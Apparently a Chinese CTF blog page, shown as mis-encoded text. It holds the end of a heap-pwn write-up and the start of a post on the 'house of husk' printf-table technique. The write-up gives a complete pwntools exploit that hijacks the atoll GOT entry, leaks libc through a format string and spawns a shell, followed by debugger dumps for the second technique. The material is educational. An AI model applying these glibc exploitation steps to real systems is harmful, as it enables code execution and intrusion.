<p>åªè¦libcçš„å€’æ•°ç¬¬å››ä¸ª16è¿›åˆ¶æ•°æ˜¯0.é‚£è¿™ä¸¤ä¸ªåœ°å€å‰é¢éƒ½ä¸€æ ·ï¼Œå°±æœ€åä¸¤ä¸ªå­—èŠ‚ä¸ä¸€æ ·ï¼Œè€Œä¸”systemçš„æœ€åä¸¤ä¸ªå­—èŠ‚æ˜¯\x50\xf5ï¼Œä½†ç»è¿‡éªŒè¯å‘ç°è·‘ä¸é€šï¼Œæºäºä»¥ä¸‹ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        heap[v2] = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size));</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">  <span class="function">__int64 __fastcall <span class="title">read_input</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(result) = __read_chk(<span class="number">0LL</span>, a1, a2, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((<span class="keyword">int</span>)result - <span class="number">1LL</span> + a1) == <span class="number">10</span> )</span><br><span class="line">    *(_BYTE *)((<span class="keyword">int</span>)result - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªoff by null,è¿™å°±æ„å‘³ç€è¦æ”¹gotè¡¨çš„è¯ï¼Œå€’æ•°ç¬¬äº”ä¸ª16è¿›åˆ¶æ•°å’Œå€’æ•°ç¬¬6ä¸ªåå…­è¿›åˆ¶æ•°ä¼šè¢«è¦†ç›–æˆ0ï¼Œæœ¬æ¥å€¼è¦†ç›–ä¸¤ä¸ªå­—èŠ‚çš„ï¼Œç»“æœè¦†ç›–äº†3ä¸ªï¼Œsystemçš„åœ°å€æ˜¯æœ‰å¯èƒ½ä¼šè¿™æ ·ï¼Œä½†å‡ ç‡å¤ªå°äº†ï¼Œ16 * 16 * 16çš„å‡ ç‡</p>
<h4 id="æ€è·¯ä¸‰"><a href="#æ€è·¯ä¸‰" class="headerlink" title="æ€è·¯ä¸‰"></a>æ€è·¯ä¸‰</h4><p>è¿™æ˜¯æˆ‘èµ°æŠ•æ— è·¯çœ‹åˆ«äººçš„wpçŸ¥é“çš„ï¼Œä¸å¾—ä¸è¯´çœŸçš„å¾ˆå·§å¦™ï¼Œæ¼æ´åˆ©ç”¨æ˜¯é—¨è‰ºæœ¯æˆ‘è§‰å¾—åœ¨è¿™é“é¢˜ä¸Šå°±æœ‰æ‰€ä½“ç°ğŸ‘ğŸ‘ï¼Œæˆ‘ä¹ŸçŸ¥é“ä»–ä¸ºå•¥åªæœ‰ä¸‰ç™¾å¤šè§£äº†ï¼Œæˆ‘å¤´ä¸€æ¬¡è§ç”¨gotè¡¨åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libcåŸºåœ°å€ï¼Œä¹Ÿæ›´åŠ ç†è§£äº†realloc,ä¸å¾—ä¸è¯´reallocçœŸçš„å¾ˆæ€ªï¼Œå‡å¦‚ptræ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œnæ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œå½“ptrå­˜åœ¨ï¼Œnå¤§äºptrçš„sizeçš„æ—¶å€™ï¼Œç«Ÿç„¶ä¸ä»tcacheä¸Šé¢æ‰¾åˆé€‚çš„é“¾è¡¨ï¼Œè€Œæ˜¯ä»topchunkä¸Šé¢é‡æ–°åˆ†é…ï¼Œå½“pträ¸å­˜åœ¨ï¼Œnå¤§äº0çš„æ—¶å€™æ‰ç›¸å½“äºä¸€èˆ¬çš„malloc,æœ€æ¶å¿ƒçš„æœºåˆ¶æ˜¯è¿˜æ˜¯ä»–ä¼šä¼šå¯¹ptrè¿›è¡Œæ£€æŸ¥ğŸ¤¢ğŸ¤¢ã€‚</p>
<p>å¤§è‡´æ€è·¯å°±æ˜¯å…ˆå¾€teacheçš„ä¸¤ä¸ªä¸åŒsizeçš„é“¾è¡¨ä¸Šä¸Šatoll_got,ç„¶åç”³è¯·ä¸€ä¸ªæ”¹atoll_gotä¸ºprintf_plt,ç„¶åæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åŸºåœ°å€ï¼Œå†æŠŠå¦ä¸€ä¸ªatol_gotç”³è¯·åˆ°ï¼Œæ”¹æˆsystemï¼Œè¾“å…¥â€™/bin/sh\x00â€™æ¥getshell.æœ€éš¾çš„æ˜¯ç¬¬ä¸€æ­¥ï¼Œä¸‹é¢æ˜¯å®ç°ç¬¬ä¸€æ­¥çš„ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ufa(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x10</span>,p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ufa(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(atoll_got))</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ä¸Šé¢çš„<span class="number">0</span>å’Œ<span class="number">1</span>å§‹ç»ˆç´§é‚»topchunk,è¿™æ ·å°±å¯ä»¥æ”¹å˜<span class="number">0</span>å’Œ<span class="number">1</span>å¯¹åº”å †çš„å¤§å°åˆä¸è‡³äºä½¿å…¶è¢«freeæ‰ï¼Œæ”¹å˜äº†sizeåå†freeçš„è¯å°±å¯ä»¥ä½¿åˆšæ‰é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå †è¿˜æ˜¯atoll_got,è¿™æ ·é‡å¤ä¸¤æ¬¡å°±å¯ä»¥äº†ã€‚</span><br></pre></td></tr></table></figure>

<p>å…ˆåˆ©ç”¨0x30é“¾è¡¨ä¸Šçš„gotæ”¹æˆprintf_plt,ç„¶åå†åˆ©ç”¨0x10æ”¹æˆsystem,æ³¨æ„é¡ºåºä¸èƒ½ä¹±ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡åatollå°±æˆpritnf,å½“ç¬¬äºŒæ¬¡æ‰§è¡Œatollå¾—åˆ°idxå’Œsizeçš„æ—¶å€™æ•°å€¼æ˜¯å‡½æ•°çš„è¿”å›å€¼ï¼Œè¿™æ—¶å€™printfçš„è¿”å›å€¼å°±è¢«å½“æˆäº†idxå’Œsize,printfçš„è¿”å›å€¼æ˜¯è¾“å‡ºçš„æ ¼å¼åŒ–å­—ç¬¦çš„ä¸ªæ•°ï¼Œè¦æƒ³ç¬¬äºŒæ¬¡idx=1,size&lt;=0x10,printfè¾“å‡ºçš„å­—ç¬¦ä¸²ä¸ªæ•°å°±å¾—ç­‰äº1å’Œå°äºç­‰äº0x10ï¼Œä¸‹é¢æ˜¯ä»£ç å®ç°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯å¤„ç†sizeçš„å‡½æ•°ä»£ç ï¼Œå¯è§printfæœ€å¤šè¾“å‡º24ä¸ªå­—ç¬¦,0x30&gt;24,æ‰€ä»¥ä¸è¡Œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">read_long</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __read_chk(<span class="number">0LL</span>, nptr, <span class="number">16LL</span>, <span class="number">17LL</span>);</span><br><span class="line">  <span class="keyword">return</span> atoll(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯æœ€ç»ˆè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoll_got=elf.got[<span class="string">&#x27;atoll&#x27;</span>]</span><br><span class="line">print_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ufa</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x4014D0&#x27;)</span></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    ufa(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x10</span>,p64(atoll_got))</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    ufa(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(atoll_got))</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">1</span>,<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x30</span>,p64(print_plt))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;%9$p&#x27;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)-<span class="number">0x3ec760</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">10</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    sh.send(p64(system))</span><br><span class="line">    free(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>gotè¡¨çœŸæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼ˆå¦‚æœèƒ½å†™çš„è¯ï¼‰</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/02/house-of-husk/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/02/house-of-husk/" class="post-title-link" itemprop="url">house of husk</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-02-02 20:23:19 / ä¿®æ”¹æ—¶é—´ï¼š20:25:39" itemprop="dateCreated datePublished" datetime="2022-02-02T20:23:19+08:00">2022-02-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h1><p>é’ˆå¯¹printfå‡½æ•°çš„æ”»å‡»ï¼Œä¸»è¦åˆ©ç”¨printfå‡½æ•°çš„è™šè¡¨ï¼Œé€šè¿‡ç¯¡æ”¹è™šè¡¨æŒ‡é’ˆæ‰§è¡Œoggã€‚</p>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>printfå‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šæ ¹æ®ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦â€%Xâ€åœ¨è™šè¡¨__printf_arginfo_tableå’Œ__printf_function_tableå¯»æ‰¾å‡½æ•°æŒ‡é’ˆè¿›è¡Œæ‰§è¡Œï¼Œå…·ä½“å¯»æ‰¾è¿‡ç¨‹å°±æ˜¯__printf_arginfo_table[â€˜Xâ€™],æ‰¾åˆ°è¿™ä¸ªæŒ‡é’ˆï¼Œç„¶åè·³åˆ°è¿™æ‰§è¡Œï¼Œåªè¦æŠŠè¿™é‡Œçš„æŒ‡é’ˆæ”¹æˆoggå°±å¯ä»¥getshell,ä¿®æ”¹è¿™é‡Œçš„æŒ‡é’ˆå¤§è‡´åˆ†ä¸ºä¸¤ç§åŠæ³•ï¼Œä¸€ç§æ˜¯ä»»ä¸€åœ°å€å†™ï¼Œç›´æ¥å†™è¿™ä¸¤ä¸ªè™šè¡¨å¯¹åº”åœ°å€çš„æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªæ˜¯é€šè¿‡å †ä¼ªé€ è¿™ä¸¤ä¸ªè™šè¡¨ï¼Œç¬¬ä¸€ä¸ªå¾ˆå¥½ç†è§£ï¼Œä¸»è¦è®²ä¸€ä¸‹ç¬¬äºŒä¸ªã€‚</p>
<h2 id="ä¼ªé€ è™šè¡¨"><a href="#ä¼ªé€ è™šè¡¨" class="headerlink" title="ä¼ªé€ è™šè¡¨"></a>ä¼ªé€ è™šè¡¨</h2><p>__printf_arginfo_tableå’Œ__printf_function_tableè¿™ä¸¤ä¸ªè™šè¡¨åœ°å€å‚¨å­˜åœ¨main_arenaä¸‹é¢çš„åœ°å€ä¸­ï¼Œè€Œä¸”å’Œmain_arenaé¦–åœ°å€å¾ˆæ¥è¿‘ï¼Œåœ¨æˆ‘è¿™ä¸ªglibcç‰ˆæœ¬ä¸‹åªç›¸å·®0xc30ï¼Œè¿™æ˜¯ä¼ªé€ çš„ç¬¬ä¸€æ­¥</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dce870 &lt;__printf_arginfo_table&gt;:	0x000000000060bb90	0x0000000000000000</span><br><span class="line">0x7ffff7dce880 &lt;buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce890 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8a0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8b0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8c0 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8d0 &lt;ttyname_buf&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8e0 &lt;getmntent_buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce8f0 &lt;qfcvt_bufptr&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dce900 &lt;buffer&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx &amp;main_arena</span></span><br><span class="line">0x7ffff7dcdc40 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x7ffff7dcdc50 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc60 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dcdc70 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>è¦æƒ³æ‰§è¡Œè¿™ä¸¤ä¸ªè™šè¡¨å‚¨å­˜çš„å‡½æ•°æŒ‡é’ˆï¼Œå¾—å…ˆæ‰¾è§è¿™ä¸¤ä¸ªè™šè¡¨åœ°å€æ‰è¡Œï¼Œç„¶åé€šè¿‡è™šè¡¨åœ°å€åŠ ä¸Šåç§»é‡å¾—åˆ°å‡½æ•°åœ°å€è·³è¿›å»æ‰§è¡Œï¼Œè¿™ä¸¤ä¸ªè™šè¡¨åœ°å€å‚¨å­˜åœ¨å›ºå®šçš„ä½ç½®ï¼Œæ‰€ä»¥åªè¦èƒ½è¦†ç›–è¿™ä¸¤ä¸ªè™šè¡¨åœ°å€æˆå †åœ°å€ï¼Œç„¶åå†ç›¸åº”åç§»é‡å¤„æ·»ä¸Šoggå°±å¯ä»¥getshelläº†å—ä¸æ˜¯ã€‚</p>
<p>ç°åœ¨å…³é”®çš„å°±æ˜¯è¦†ç›–è™šè¡¨åœ°å€ï¼Œç½‘ä¸Šçš„æ™®éåšæ³•æ˜¯åˆ©ç”¨House of CorrosionæŠ€æœ¯ã€‚è¿™ä¸ªæŠ€æœ¯å’Œfastbinæ¯æ¯ç›¸å…³ã€‚</p>
<h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œfastbiné“¾è¡¨çš„å¤§å°æ˜¯0x20åˆ°0x80ä¹‹é—´ï¼Œä½†å…¶å®æœ€å¤§å€¼å¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè€Œæ˜¯global_max_fastä¸­çš„å€¼å†³å®šçš„ï¼Œä¸€èˆ¬æ˜¯0x80,æ‰€ä»¥fastbinçš„æœ€å¤§å€¼å°±æ˜¯0x80</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥é€šè¿‡æ”¹å˜è¿™ä¸ªåœ°æ–¹çš„å€¼è®©fasbinèƒ½æ¥å—çš„æœ€å¤§å€¼å˜å¤§ï¼Œä¸€èˆ¬æ˜¯åˆ©ç”¨unsortbinattackï¼Œä¹Ÿå¯ä»¥ç›´æ¥ufaæ¥å®Œæˆã€‚</p>
